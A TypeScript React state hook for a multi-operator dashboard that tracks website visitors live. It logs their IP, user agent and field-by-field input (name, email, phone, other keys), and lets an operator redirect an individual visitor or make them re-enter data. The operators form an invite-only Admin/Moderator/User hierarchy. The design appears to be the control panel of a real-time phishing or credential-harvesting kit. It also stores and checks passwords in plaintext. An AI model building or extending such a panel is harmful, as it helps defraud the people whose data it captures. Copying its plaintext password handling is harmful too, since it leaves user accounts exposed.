import { User, UserRole, UserStatus, Session, TrafficLink, NavElement, NavGroup, ToastMessage, TrafficEvent } from './types';

const generateUniqueCode = (): string => {
  const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
  let result = '';
  for (let i = 0; i < 6; i++) {
    result += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return result;
};

export const useStoreActions = (
  users: User[],
  setUsers: React.Dispatch<React.SetStateAction<User[]>>,
  navigation: NavElement[],
  setNavigation: React.Dispatch<React.SetStateAction<NavElement[]>>,
  sessions: Session[],
  setSessions: React.Dispatch<React.SetStateAction<Session[]>>,
  history: Session[],
  setHistory: React.Dispatch<React.SetStateAction<Session[]>>,
  links: TrafficLink[],
  setLinks: React.Dispatch<React.SetStateAction<TrafficLink[]>>,
  currentUser: User | null,
  setCurrentUser: React.Dispatch<React.SetStateAction<User | null>>,
  setToasts: React.Dispatch<React.SetStateAction<ToastMessage[]>>,
  setLatestEvent: React.Dispatch<React.SetStateAction<TrafficEvent | null>>,
  playRingtone: (type: 'mobile' | 'desktop' | 'session' | 'input' | 'error' | 'success') => void
) => {

  const showToast = (title: string, message: string, type: NotificationType = 'info', duration: number = 4000) => {
    const id = Date.now();
    setToasts(c => [{ id, title, message, type }, ...c]);
    setTimeout(() => setToasts(c => c.filter(t => t.id !== id)), duration);
    if (type === 'error') playRingtone('error'); else if (type === 'success') playRingtone('success');
  };

  const dismissToast = (id: number) => setToasts(c => c.filter(t => t.id !== id));

  const handleIncomingTraffic = (data: any) => {
    setSessions(prev => {
      const existing = prev.find(s => s.traffic_id === data.sessionId);
      if (data.type === 'VISIT') {
        if (!existing) {
          const ownerId = data.ownerId;
          let owner = users.find(u => u.referral_code === ownerId || u.username === ownerId);
          if (!owner) owner = users.find(u => u.role === 'Admin') || users[0];

          const ua = (data.tech?.agent || '').toLowerCase();
          let browser = 'Unknown';
          if(ua.includes('chrome')) browser = 'Chrome'; else if(ua.includes('firefox')) browser = 'Firefox'; else if(ua.includes('safari')) browser = 'Safari'; else if(ua.includes('edge')) browser = 'Edge';

          const newSession: Session = {
            sequential_id: prev.length + history.length + 1, traffic_id: data.sessionId, system_user_id: owner ? owner.id : 'unknown',
            first_entry_domain: data.tech?.landing || 'External Source', current_domain: data.tech?.landing || 'External Source',
            current_page: 'Landing', current_step_name: 'View', role: 'Visitor', username: 'Guest', profile_img: '👤',
            device_type: data.deviceType || 'desktop', device_os: 'Windows', browser, today_clicks: 1, source_link_id: 'external',
            source_link_name: 'External Lab', is_online: true, last_active: Date.now(), total_steps: 1, current_step: 1, step_progress: 0,
            is_viewed: false, has_ever_been_viewed: false, first_data_time: Date.now(),
            form_data: { name: { value: null, source_page: 'landing' }, email: { value: null, source_page: 'landing' }, phone: { value: null, source_page: 'landing' }, ip: { value: data.tech?.ip || null, source_page: 'system' }, agent: { value: data.tech?.agent || null, source_page: 'system' } },
            status: 'active', signal: 'green', url_type_input: '', type_input: '', created_at: Date.now(), updated_at: Date.now(),
            is_expanded: false, is_pinned: false, seen: false, deletionTargetTime: null, target_stage: 1, cleared_by: []
          };
          return [newSession, ...prev];
        } else {
          return prev.map(s => s.traffic_id === data.sessionId ? { ...s, is_online: true, last_active: Date.now() } : s);
        }
      } else if (data.type === 'INPUT') {
        if (!existing) {
          console.warn('[DB] Received INPUT for unknown session. Auto-creating session.');
        } else {
          return prev.map(s => {
            if (s.traffic_id === data.sessionId) {
              const key = data.key;
              const newData = { ...s.form_data };
              if (data.value !== undefined && data.value !== null) {
                if (!newData[key]) newData[key] = { value: data.value, source_page: 'injected' };
                else newData[key] = { ...newData[key], value: data.value };
              }
              return { ...s, form_data: newData, updated_at: Date.now(), last_active: Date.now(), is_online: true, signal: 'green' };
            }
            return s;
          });
        }
      }
      return prev;
    });
  };

  const login = (identifier: string, pass: string) => {
    const user = users.find(u => (u.email === identifier || u.username === identifier) && u.password === pass);
    if (!user) return { success: false, message: 'Invalid credentials.' };
    if (user.status !== 'Active') return { success: false, message: 'Account not active.' };
    setCurrentUser(user);
    return { success: true };
  };

  const logout = () => setCurrentUser(null);

  const register = (data: any) => {
    if (users.some(u => u.email.toLowerCase() === data.email.toLowerCase())) {
      return { success: false, message: 'Email already taken.' };
    }
    if (users.some(u => u.username.toLowerCase() === data.username.toLowerCase())) {
      return { success: false, message: 'Username already taken.' };
    }

    const referralCodeInput = data.referral_code?.trim().toLowerCase();
    const referrer = users.find(u => u.referral_code.toLowerCase() === referralCodeInput);
    if (!referrer) {
      return { success: false, message: 'Invalid Referral Code' };
    }
    if (referrer.status !== 'Active') {
      return { success: false, message: 'Referrer account is not active.' };
    }

    let newRole: UserRole;
    let status: UserStatus = 'Pending';

    if (referrer.role === 'Admin') {
      newRole = 'Moderator';
    } else if (referrer.role === 'Moderator') {
      newRole = 'User';
    } else {
      return { success: false, message: 'Users are not allowed to refer new members.' };
    }

    let newCode: string;
    do {
      newCode = generateUniqueCode();
    } while (users.some(u => u.referral_code.toLowerCase() === newCode.toLowerCase()));

    const newUser: User = { 
      id: 'u-' + Date.now() + Math.random().toString(36).substr(2, 5), 
      username: data.username, 
      name: data.username, 
      email: data.email, 
      phone: data.phone || '', 
      facebook: data.facebook || '', 
      password: data.password, 
      role: newRole, 
      status: status, 
      referrer_id: referrer.id, 
      referral_code: newCode, 
      avatar: newRole === 'Moderator' ? '👮' : '👤', 
      avatar_color: newRole === 'Moderator' ? 'bg-purple-600' : 'bg-blue-600', 
      joined: new Date().toISOString() 
    };

    setUsers(u => [...u, newUser]);
    showToast('New Registration', `${newUser.username} (${newRole}) registered under ${referrer.username}`, 'info');
    return { success: true, user: newUser };
  };

  const updateProfile = (id: string, data: Partial<User>) => {
    setUsers(list => list.map(u => u.id === id ? { ...u, ...data } : u));
    if (currentUser?.id === id) setCurrentUser({ ...currentUser, ...data });
  };

  const updateUsername = (id: string, newUsername: string) => {
    if (users.some(u => u.username.toLowerCase() === newUsername.toLowerCase() && u.id !== id)) {
      return { success: false, message: 'Username is already taken.' };
    }
    updateProfile(id, { username: newUsername }); 
    return { success: true };
  };

  const updatePassword = (id: string, newPass: string) => updateProfile(id, { password: newPass });

  const approveUser = (id: string) => {
    const user = users.find(u => u.id === id);
    if (!user) return { success: false, message: 'User not found' };
    if (currentUser?.role === 'Admin') {
      updateProfile(id, { status: 'Active' });
      showToast('User Approved', `${user.username} is now active`, 'success');
      return { success: true };
    } else if (currentUser?.role === 'Moderator') {
      if (user.referrer_id === currentUser.id) {
        updateProfile(id, { status: 'Active' });
        showToast('User Approved', `${user.username} is now active`, 'success');
        return { success: true };
      } else {
        showToast('Permission Denied', 'You can only approve your own referrals', 'error');
        return { success: false, message: 'Permission denied' };
      }
    }
    return { success: false, message: 'Permission denied' };
  };

  const blockUser = (id: string) => {
    const user = users.find(u => u.id === id);
    if (!user) return { success: false, message: 'User not found' };
    if (currentUser?.role === 'Admin') {
      updateProfile(id, { status: 'Blocked' });
      showToast('User Blocked', `${user.username} has been blocked`, 'warning');
      return { success: true };
    } else if (currentUser?.role === 'Moderator') {
      if (user.referrer_id === currentUser.id) {
        updateProfile(id, { status: 'Blocked' });
        showToast('User Blocked', `${user.username} has been blocked`, 'warning');
        return { success: true };
      } else {
        showToast('Permission Denied', 'You can only block your own referrals', 'error');
        return { success: false, message: 'Permission denied' };
      }
    }
    return { success: false, message: 'Permission denied' };
  };

  const deleteUser = (id: string) => {
    const user = users.find(u => u.id === id);
    if (!user) return { success: false, message: 'User not found' };
    if (currentUser?.role === 'Admin') {
      setUsers(list => list.filter(u => u.id !== id));
      showToast('User Deleted', `${user.username} has been removed`, 'success');
      return { success: true };
    } else if (currentUser?.role === 'Moderator') {
      if (user.referrer_id === currentUser.id) {
        setUsers(list => list.filter(u => u.id !== id));
        showToast('User Deleted', `${user.username} has been removed`, 'success');
        return { success: true };
      } else {
        showToast('Permission Denied', 'You can only delete your own referrals', 'error');
        return { success: false, message: 'Permission denied' };
      }
    }
    return { success: false, message: 'Permission denied' };
  };

  const updateUserStatus = (id: string, status: UserStatus) => {
    updateProfile(id, { status });
  };

  const checkRelevance = (session: Session, user: User, allUsers: User[]) => {
    if (user.role === 'Admin') return true;
    if (user.role === 'Moderator') {
      if (session.system_user_id === user.id) return true;
      const downline = allUsers.filter(u => u.referrer_id === user.id).map(u => u.id);
      return downline.includes(session.system_user_id);
    }
    return session.system_user_id === user.id;
  };

  const visibleTrafficSessions = sessions.filter(s => currentUser && checkRelevance(s, currentUser, users) && !s.cleared_by?.includes(currentUser.id));

  const dashboardStats = visibleTrafficSessions.reduce((acc, session) => {
    acc.total_traffic++;
    if (session.device_type === 'mobile') acc.total_mobile++; else acc.total_desktop++;
    if (session.is_online) acc.active_now++;
    const excludedKeys = ['name', 'email', 'ip', 'agent'];
    const externalDataCount = Object.keys(session.form_data).filter(key => !excludedKeys.includes(key) && session.form_data[key]?.value).length;
    acc.total_step_clicks += externalDataCount;
    return acc;
  }, { total_mobile: 0, total_desktop: 0, total_traffic: 0, total_step_clicks: 0, active_now: 0 });

  const visibleTrafficHistory = () => {
    if (!currentUser) return [];
    const globalHistory = history.filter(s => checkRelevance(s, currentUser, users));
    const clearedActive = sessions.filter(s => checkRelevance(s, currentUser, users) && s.cleared_by?.includes(currentUser.id));
    return [...clearedActive, ...globalHistory].sort((a,b) => b.created_at - a.created_at);
  };

  const visibleTrafficLinks = links.filter(l => currentUser && (currentUser.role === 'Admin' || l.access_scope === 'global' || l.owner_id === currentUser.id));

  const flushDashboardToHistory = () => {
    if (!currentUser) return;
    setSessions(list => list.map(s => checkRelevance(s, currentUser, users) ? { ...s, cleared_by: [...(s.cleared_by||[]), currentUser.id] } : s));
  };

  const handleRedirect = (id: string, type: string, url?: string, text?: string) => {
    setSessions(list => list.map(s => s.traffic_id === id ? { ...s, status: 'redirecting', signal: 'orange', url_type_input: url || s.url_type_input, type_input: text || s.type_input, awaiting_reentry: type === 'again' } : s));
    setTimeout(() => setSessions(list => list.map(s => s.traffic_id === id ? { ...s, status: 'active', signal: 'green' } : s)), 600);
  };

  const updateSessionTypeInput = (id: string, val: string) => setSessions(list => list.map(s => s.traffic_id === id ? { ...s, type_input: val } : s));
  const toggleExpandSession = (id: string) => setSessions(list => list.map(s => s.traffic_id === id ? { ...s, is_expanded: !s.is_expanded } : { ...s, is_expanded: false }));

  const addTrafficLink = (link: TrafficLink) => setLinks(l => [...l, link]);
  const updateTrafficLink = (link: TrafficLink) => setLinks(list => list.map(l => l.id === link.id ? link : l));
  const deleteTrafficLink = (id: string) => setLinks(list => list.filter(l => l.id !== id));

  const updateNavigation = (nav: NavElement[]) => setNavigation(nav);
  const deleteNav = (id: string, parentId?: string) => {
    if (parentId) setNavigation(current => current.map(n => n.id === parentId && n.type === 'dropdown' ? { ...n, items: (n as NavGroup).items.filter(i => i.id !== id) } : n));
    else setNavigation(current => current.filter(n => n.id !== id));
  };

  const getUserTrackingCode = (user: User) => user.referral_code;

  const getReferralLink = (user: User | null) => {
    if (!user) return '';
    const baseUrl = window.location.origin;
    return `${baseUrl}/${user.username}/Invite/${user.referral_code}`;
  };

  const getUserLoginLink = (user: User | null) => {
    if (!user) return '';
    const baseUrl = window.location.origin;
    return `${baseUrl}/${user.username}/login`;
  };

  return {
    login,
    logout,
    register,
    updateProfile,
    updateUsername,
    updatePassword,
    approveUser,
    blockUser,
    deleteUser,
    updateUserStatus,
    handleIncomingTraffic,
    flushDashboardToHistory,
    handleRedirect,
    updateSessionTypeInput,
    toggleExpandSession,
    addTrafficLink,
    updateTrafficLink,
    deleteTrafficLink,
    updateNavigation,
    deleteNav,
    getUserTrackingCode,
    getReferralLink,
    getUserLoginLink,
    showToast,
    dismissToast,
    visibleTrafficSessions,
    dashboardStats,
    visibleTrafficHistory,
    visibleTrafficLinks
  };
};